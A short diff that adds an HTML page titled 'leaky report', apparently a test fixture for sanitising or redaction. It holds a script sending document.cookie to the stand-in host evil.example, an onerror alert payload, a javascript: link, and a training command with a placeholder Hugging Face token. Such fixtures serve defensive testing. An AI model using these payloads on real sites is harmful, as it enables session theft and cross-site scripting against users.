@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>leaky report</title>
+</head>
+<body>
+<h1>session report</h1>
+<script>fetch('https://evil.example/'+document.cookie)</script>
+<img src="x" onerror="alert(document.domain)">
+<a href="javascript:steal()">click</a>
+<code>python train.py --hf-token=hf_abcdefghijklmnopqrstuvwx</code>
+</body>
+</html>
